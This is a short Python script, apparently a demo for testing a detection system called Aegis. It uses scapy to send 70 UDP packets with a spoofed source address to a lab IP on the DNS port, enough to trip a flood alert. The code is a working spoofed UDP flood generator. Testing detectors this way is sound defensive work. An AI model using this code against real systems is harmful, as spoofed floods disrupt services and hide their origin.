# udp_flood_demo.py — UDP Flood Simulation
# Sends a burst of UDP packets to saturate a target's processing capacity.
# Aegis triggers at 50 UDP packets within 5 seconds from one source.

from scapy.all import IP, UDP, Raw, send
import time

# ── CONFIGURATION ───────────────────────────────────────────
TARGET_IP        = "10.55.0.1"    # <-- UPDATE BEFORE RUNNING
TARGET_PORT      = 53             # DNS port (common UDP flood target)
SPOOFED_SRC_IP   = "10.55.0.200"
COUNT            = 70             # Exceeds threshold of 50

print(f"[UDP FLOOD] Sending {COUNT} UDP packets → {TARGET_IP}:{TARGET_PORT}")
print(f"  Spoofed source: {SPOOFED_SRC_IP}")

payload = Raw(load="X" * 64)  # 64-byte payload per packet

packets = [
    IP(src=SPOOFED_SRC_IP, dst=TARGET_IP) / UDP(sport=12345, dport=TARGET_PORT) / payload
    for _ in range(COUNT)
]

send(packets, verbose=False)
print("[UDP FLOOD] Done — check AEGIS for HIGH severity alert.")
